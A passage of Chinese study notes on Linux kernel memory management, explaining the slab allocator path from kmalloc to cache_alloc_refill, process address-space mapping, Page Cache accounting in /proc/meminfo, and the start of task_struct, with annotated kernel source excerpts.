mm/slab.c中的实现</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">__kmalloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">__do_kmalloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> _RET_IP_<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">__do_kmalloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">,</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> caller<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span>ret<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>size <span class="token operator">&gt;</span> KMALLOC_MAX_CACHE_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>cachep <span class="token operator">=</span> <span class="token function">kmalloc_slab</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//查找size对应的kmem_cache</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">ZERO_OR_NULL_PTR</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> cachep<span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token function">slab_alloc</span><span class="token punctuation">(</span>cachep<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> caller<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//查到空闲的对象，进行分配</span><span class="token comment">//...</span><span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="查找-kmem-cache">查找 kmem_cache</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* * Find the kmem_cache structure that serves a given size of * allocation */</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span><span class="token function">kmalloc_slab</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> index<span class="token punctuation">;</span><span class="token comment">//计算出index</span><span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;=</span> <span class="token number">192</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>size<span class="token punctuation">)</span><span class="token keyword">return</span> ZERO_SIZE_PTR<span class="token punctuation">;</span>index <span class="token operator">=</span> size_index<span class="token punctuation">[</span><span class="token function">size_index_elem</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>size <span class="token operator">&gt;</span> KMALLOC_MAX_CACHE_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">WARN_ON</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span>index <span class="token operator">=</span> <span class="token function">fls</span><span class="token punctuation">(</span>size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_ZONE_DMA</span></span><span class="token comment">//...</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token keyword">return</span> kmalloc_caches<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//kmalloc_caches是个全局二维数组，kmalloc_slab只是根据分配大小和分配标志计算出数组下标后取出其中kmem_cache结构指针</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>一页的大小是4K，所以PAGE_SHIFT值为12，往左偏移12位</p><p>MAX_ORDER值为11，即为伙伴算法块链表数</p><p>所以内核中最多可以定义23个高速缓存结构体</p></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//建立所有的kmalloc_caches中的kmem_cache，高速缓存索引和object size对应关系</span><span class="token keyword">void</span> __init <span class="token function">create_kmalloc_caches</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> KMALLOC_SHIFT_LOW<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> KMALLOC_SHIFT_HIGH<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>kmalloc_caches<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token comment">//建立一个新的kmem_cache</span><span class="token function">new_kmalloc_cache</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//第5个开始</span><span class="token comment">/* * Caches that are not of the two-to-the-power-of size. * These have to be created immediately after the * earlier power of two caches */</span><span class="token keyword">if</span> <span class="token punctuation">(</span>KMALLOC_MIN_SIZE <span class="token operator">&lt;=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token function">new_kmalloc_cache</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>KMALLOC_MIN_SIZE <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token function">new_kmalloc_cache</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* Kmalloc array is now usable */</span>slab_state <span class="token operator">=</span> UP<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_ZONE_DMA</span></span><span class="token comment">//...</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">void</span> __init <span class="token function">new_kmalloc_cache</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">)</span><span class="token punctuation">{</span>kmalloc_caches<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">create_kmalloc_cache</span><span class="token punctuation">(</span>kmalloc_info<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>kmalloc_info<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>size<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> size<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">const</span> kmalloc_info<span class="token punctuation">[</span><span class="token punctuation">]</span> __initconst <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token constant">NULL</span><span class="token punctuation">,</span>                      <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-96"</span><span class="token punctuation">,</span>             <span class="token number">96</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-192"</span><span class="token punctuation">,</span>           <span class="token number">192</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-8"</span><span class="token punctuation">,</span>               <span class="token number">8</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-16"</span><span class="token punctuation">,</span>             <span class="token number">16</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-32"</span><span class="token punctuation">,</span>             <span class="token number">32</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-64"</span><span class="token punctuation">,</span>             <span class="token number">64</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-128"</span><span class="token punctuation">,</span>           <span class="token number">128</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment">//...</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="分配对象">分配对象</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">slab_alloc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> caller<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> save_flags<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>objp<span class="token punctuation">;</span>    <span class="token comment">//关中断</span>    <span class="token function">local_irq_save</span><span class="token punctuation">(</span>save_flags<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//分配对象</span>    objp <span class="token operator">=</span> <span class="token function">__do_cache_alloc</span><span class="token punctuation">(</span>cachep<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//恢复中断</span>    <span class="token function">local_irq_restore</span><span class="token punctuation">(</span>save_flags<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> objp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>__do_cache_alloc</code> 函数 → <code>____cache_alloc</code> 函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">__do_cache_alloc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">____cache_alloc</span><span class="token punctuation">(</span>cachep<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">____cache_alloc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span>objp<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">array_cache</span> <span class="token operator">*</span>ac<span class="token punctuation">;</span>    <span class="token comment">//获取当前cpu在cachep结构中的array_cache结构的指针</span>    ac <span class="token operator">=</span> <span class="token function">cpu_cache_get</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//如果ac中的avail不为0,说明当前kmem_cache结构中freelist是有空闲对象</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">likely</span><span class="token punctuation">(</span>ac<span class="token operator">-&gt;</span>avail<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ac<span class="token operator">-&gt;</span>touched <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">//空间对象的地址保存在ac-&gt;entry</span>        objp <span class="token operator">=</span> ac<span class="token operator">-&gt;</span>entry<span class="token punctuation">[</span><span class="token operator">--</span>ac<span class="token operator">-&gt;</span>avail<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> out<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//如果array_cache结构中没有空闲对象了，调用cache_alloc_refill函数</span>    objp <span class="token operator">=</span> <span class="token function">cache_alloc_refill</span><span class="token punctuation">(</span>cachep<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token operator">:</span>    <span class="token keyword">return</span> objp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>cache_alloc_refill</code> 函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">cache_alloc_refill</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> batchcount<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">kmem_cache_node</span> <span class="token operator">*</span>n<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">array_cache</span> <span class="token operator">*</span>ac<span class="token punctuation">,</span> <span class="token operator">*</span>shared<span class="token punctuation">;</span>    <span class="token keyword">int</span> node<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>list <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>    <span class="token comment">//获取内存节点</span>    node <span class="token operator">=</span> <span class="token function">numa_mem_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ac <span class="token operator">=</span> <span class="token function">cpu_cache_get</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">;</span>    batchcount <span class="token operator">=</span> ac<span class="token operator">-&gt;</span>batchcount<span class="token punctuation">;</span>    <span class="token comment">//获取cachep所属的kmem_cache_node</span>    n <span class="token operator">=</span> <span class="token function">get_node</span><span class="token punctuation">(</span>cachep<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">;</span>    shared <span class="token operator">=</span> <span class="token function">READ_ONCE</span><span class="token punctuation">(</span>n<span class="token operator">-&gt;</span>shared<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>n<span class="token operator">-&gt;</span>free_objects <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">!</span>shared <span class="token operator">||</span> <span class="token operator">!</span>shared<span class="token operator">-&gt;</span>avail<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">goto</span> direct_grow<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>batchcount <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//获取kmem_cache_node结构中其它kmem_cache</span>        <span class="token comment">//返回的是page，page会指向kmem_cache</span>        page <span class="token operator">=</span> <span class="token function">get_first_slab</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> false<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>page<span class="token punctuation">)</span><span class="token comment">//没有了</span>            <span class="token keyword">goto</span> must_grow<span class="token punctuation">;</span>        batchcount <span class="token operator">=</span> <span class="token function">alloc_block</span><span class="token punctuation">(</span>cachep<span class="token punctuation">,</span> ac<span class="token punctuation">,</span> page<span class="token punctuation">,</span> batchcount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>must_grow<span class="token operator">:</span>    n<span class="token operator">-&gt;</span>free_objects <span class="token operator">-=</span> ac<span class="token operator">-&gt;</span>avail<span class="token punctuation">;</span>direct_grow<span class="token operator">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>ac<span class="token operator">-&gt;</span>avail<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//分配新的kmem_cache并初始化</span>        page <span class="token operator">=</span> <span class="token function">cache_grow_begin</span><span class="token punctuation">(</span>cachep<span class="token punctuation">,</span> <span class="token function">gfp_exact_node</span><span class="token punctuation">(</span>flags<span class="token punctuation">)</span><span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">;</span>        ac <span class="token operator">=</span> <span class="token function">cpu_cache_get</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ac<span class="token operator">-&gt;</span>avail <span class="token operator">&amp;&amp;</span> page<span class="token punctuation">)</span>            <span class="token function">alloc_block</span><span class="token punctuation">(</span>cachep<span class="token punctuation">,</span> ac<span class="token punctuation">,</span> page<span class="token punctuation">,</span> batchcount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//让page挂载到kmem_cache_node结构的slabs_list链表上</span>        <span class="token function">cache_grow_end</span><span class="token punctuation">(</span>cachep<span class="token punctuation">,</span> page<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ac<span class="token operator">-&gt;</span>avail<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    ac<span class="token operator">-&gt;</span>touched <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">//重新分配</span>    <span class="token keyword">return</span> ac<span class="token operator">-&gt;</span>entry<span class="token punctuation">[</span><span class="token operator">--</span>ac<span class="token operator">-&gt;</span>avail<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span><span class="token function">get_first_slab</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache_node</span> <span class="token operator">*</span>n<span class="token punctuation">,</span> bool pfmemalloc<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>    <span class="token function">assert_spin_locked</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>n<span class="token operator">-&gt;</span>list_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//首先从kmem_cache_node结构中的slabs_partial链表上查看有没有page</span>    page <span class="token operator">=</span> <span class="token function">list_first_entry_or_null</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>n<span class="token operator">-&gt;</span>slabs_partial<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">page</span><span class="token punctuation">,</span>slab_list<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>page<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">//如果没有</span>        n<span class="token operator">-&gt;</span>free_touched <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">//从kmem_cache_node结构中的slabs_free链表上查看有没有page</span>        page <span class="token operator">=</span> <span class="token function">list_first_entry_or_null</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>n<span class="token operator">-&gt;</span>slabs_free<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">page</span><span class="token punctuation">,</span>slab_list<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>page<span class="token punctuation">)</span>            n<span class="token operator">-&gt;</span>free_slabs<span class="token operator">--</span><span class="token punctuation">;</span> <span class="token comment">//空闲slab计数减一</span>    <span class="token punctuation">}</span>    <span class="token comment">//返回page</span>    <span class="token keyword">return</span> page<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="进程虚拟地址空间管理">进程虚拟地址空间管理</h3><ul><li><p>进程如何管理和分配它的3G虚拟地址空间？</p><p><strong>分治思想</strong></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220118-vma.png" alt=""></p></li><li><p>1</p></li></ul><p><code>/proc/PID/maps</code>显示进程映射了的内存区域和访问权限</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220118-maps.png" alt=""></p><blockquote><p>内核中进程的一段地址空间用一个<code>vm_area_struct</code>结构体表示，所有地址空间存储在 <strong>task -&gt; mm -&gt; mmap</strong>链表中</p></blockquote><h3 id="内存池">内存池</h3><p>内核态内存池</p><p>用户态内存池</p><h3 id="DMA-内存">DMA 内存</h3><ol><li>直接内存访问是一种<strong>硬件机制</strong>，它允许外围设备和主内存之间直接传输它们的 I/O 数据，而不需要系统处理器的参与</li></ol><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220118-vm_area_struct.jpg" alt=""></p><h3 id="Page-Cache">Page Cache</h3><p>服务器的 load 飙高、服务器的 I/O 吞吐飙高、业务响应时延出现大的毛刺、业务平均访问时延明显增加 … 这些问题很可能是由于 Page Cache 管理不到位引起的，Page Cache 管理不当除了会增加系统 I/O 吞吐外，还会引起业务性能抖动</p><h4 id="什么是-Page-Cache">什么是 Page Cache</h4><ul><li><p>Page Cache 是内核管理的内存，它不属于用户</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211126-page-cache.jpg" alt="应用程序产生Page Cache的逻辑示意图"></p></li><li><p>Linux 上直接查看 Page Cache 的方式包括 <code>/proc/meminfo</code>、<code>free</code> 、<code>/proc/vmstat</code> 命令等</p><blockquote><p>/proc/meminfo：</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211127-meminfo.png" alt=""></p><p><a href="https://github.com/mmalecki/procps/blob/master/free.c">free</a>：通过解析 /proc/meminfo 得出统计数据</p><p><strong>buff/cache = Buffers + Cached + SReclaimable</strong></p></blockquote></li><li><p><strong>Buffers + Cached + SwapCached = Active(file) + Inactive(file) + Shmem + SwapCached</strong></p><p>等式的两边就是 Page Cache</p><p><strong>Active(file) + Inactive(file)</strong> 是 File-backed page（与文件对应的内存页），mmap() 内存映射方式和 buffered I/O 消耗的内存就属于这部分</p><p><strong>SwapCached</strong> 是在打开了 Swap 分区后，把 Inactive(anon) + Active(anon) 这两项里的匿名页给交换到磁盘（swap out），然后再读入到内存（swap in）后分配的内存，由于读入到内存后原来的 Swap File 还在，所以 SwapCached 也可以认为是 File-backed page，这样做的目的是为了减少 I/O</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211127-swapcached.jpg" alt=""></p><blockquote><p>SwapCached 只在 Swap 分区打开的情况下才会有，建议在生产环境中关闭 Swap 分区，因为 Swap 过程产生的 I/O 会很容易引起性能抖动</p></blockquote><p><strong>Shmem</strong> 是指匿名共享映射这种方式分配的内存（free 命令中 shared 这一项），比如 tmpfs（临时文件系统）</p></li></ul><p><a href="https://github.com/mmalecki/procps/blob/master/free.c">https://github.com/mmalecki/procps/blob/master/free.c</a></p><h4 id="为什么需要-Page-Cache-？">为什么需要 Page Cache ？</h4><ul><li>标准 I/O 和内存映射会先把数据写入到 Page Cache，这样做会通过减少 I/O 次数来提升读写效率</li></ul><h2 id="06-进程与进程调度">06 | 进程与进程调度</h2><h3 id="Linux-进程">Linux 进程</h3><h4 id="进程数据结构">进程数据结构</h4><ul><li><p>Linux 把运行中的应用程序抽象成一个数据结构 <code>task_struct</code>，一个应用程序所需要的各种资源（如内存、文件等）都包含在这个结构中，内存中一个 task_struct 结构体的实例变量代表一个 Linux 进程</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">thread_info</span> thread_info<span class="token punctuation">;</span><span class="token comment">//处理器特有数据 </span>    <span class="token keyword">volatile</span> <span class="token keyword">long</span>   state<span class="token punctuation">;</span>       <span class="token comment">//进程状态 </span>    <span class="token keyword">void</span>            <span class="token operator">*</span>stack<span class="token punctuation">;</span>      <span class="token comment">//进程内核栈地址 </span>    refcount_t      usage<span class="token punctuation">;</span>       <span class="token comment">//进程使用计数</span>    <span class="token keyword">int</span>             on_rq<span class="token punctuation">;</span>       <span class="token comment">//进程是否在运行队列上</span>    <span class="token keyword">int</span>             prio<span class="token punctuation">;</span>        <span class="token comment">//动态优先级</span>    <span class="token keyword">int</span>             static_prio<span class="token punctuation">;</span> <span class="token comment">//静态优先级</span>    <span class="token keyword">int</span>             normal_prio<span class="token punctuation">;</span> <span class="token comment">//取决于静态优先级和调度策略</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span>    rt_priority<span class="token punctuation">;</span> <span class="token comment">//实时优先级</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">sched_class</span>    <span class="token operator">*</span>sched_class<span class="token punctuation">;</span><span class="token comment">//指向其所在的调度类</span>    <span class="token keyword">struct</span> <span class="token class-name">sched_entity</span>         se<span class="token punctuation">;</span><span class="token comment">//普通进程的调度实体</span>    <span class="token keyword">struct</span> <span class="token class-name">sched_rt_entity</span>      rt<span class="token punctuation">;</span><span class="token comment">//实时进程的调度实体</span>    <span class="token keyword">struct</span> <span class="token class-name">sched_dl_entity</span>      dl<span class="token punctuation">;</span><span class="token comment">//采用EDF算法调度实时进程的调度实体</span>    <span class="token keyword">struct</span> <span class="token class-name">sched_info</span>       sched_info<span class="token punctuation">;</span><span class="token comment">//用于调度器统计进程的运行信息 </span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span>        tasks<span class="token punctuation">;</span><span class="token comment">//所有进程的链表</span>    <span class="token keyword">struct</span> <span class="token class-name">mm_struct</span>        <span class="token operator">*</span>mm<span class="token punctuation">;</span>  <span class="token comment">//指向进程内存结构</span>    <span class="token keyword">struct</span> <span class="token class-name">mm_struct</span>        <span class="token operator">*</span>active_mm<span class="token punctuation">;</span>    pid_t               pid<span class="token punctuation">;</span>            <span class="token comment">//进程id</span>    <span class="token keyword">struct</span> <span class="token class-name">task_struct</span> __rcu    <span class="token 